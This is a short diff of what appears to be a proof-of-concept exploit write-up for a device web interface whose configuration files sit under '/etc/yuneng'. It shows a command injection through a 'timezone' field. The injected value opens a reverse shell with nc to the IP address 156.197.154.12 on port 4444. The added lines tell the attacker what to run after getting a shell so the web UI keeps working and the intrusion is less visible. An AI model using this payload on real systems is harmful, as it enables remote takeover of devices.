@@ -71,3 +71,7 @@ timezone=`/bin/sh 0</tmp/backpipe | nc 156.197.154.12 4444 1>/tmp/backpipe`
 ```
 POC : 
 ![Alt Text](POC.png)
+
+** note **
+- please use the following command after getting shell to avoid distorying the WEBUI 
+"echo Asia/Taipei > /etc/yuneng/timezone.conf"
